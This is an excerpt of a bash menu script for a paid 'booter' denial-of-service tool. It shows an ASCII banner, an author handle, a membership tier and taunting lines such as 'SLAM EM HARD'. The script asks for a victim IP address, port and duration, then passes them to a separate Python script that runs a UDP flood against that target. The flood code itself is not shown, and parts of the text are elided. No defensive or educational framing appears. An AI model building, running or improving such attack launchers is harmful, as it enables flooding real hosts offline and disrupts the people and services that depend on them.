...
echo "Enter target ip BITCH :"
read ip
echo "Enter a Port Number  :"
read port
echo "Enter the time seconds :"
read time
...
udp_flooda(){
echo -en "Packets Ready FOR Attck
Please Enter  Victims IP Address:"
read ip
echo -en "Please Enter Victims Port:"
read port
echo -en "Please Enter A Time:"
read time
python gott.2.py ${ip} ${port} ${time} 
}
...
do
clear;clear
echo -en "${RED}Coded By:${BROWN}Jeff  ${BROWN}MEMBERSHIP:${RED}1 MONTH  
${BROWN}HMU ${RED}ON ${BROWN}INSTAGRAM ${RED}@WOAHJEF
 ${LIGHTBLUE}                 	                                                                                                                             
:::    :::     :::      ::::::::  :::    ::: :::::::::: :::::::::  
:+:    :+:   :+: :+:   :+:    :+: :+:   :+:  :+:        :+:    :+: 
+:+    +:+  +:+   +:+  +:+        +:+  +:+   +:+        +:+    +:+ 
...
${BROWN}============================================
${LIGHTBLUE}*YOUR PRIVATE DDOS SCRIPT*                                                      
${RED}PRESS 1 TO START AN ATTACK DUH!              
${GREEN}PRESS CTRL+C TO STOP HITTING THEM.         
${RED}SLAM EM HARD JEFF            
${LIGHTBLUE}DONT TALK DOWN ON MY BOOTER             
${BROWN}============================================
${RED}#${USERNAME}-[Welcome]:${BROWN}"
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
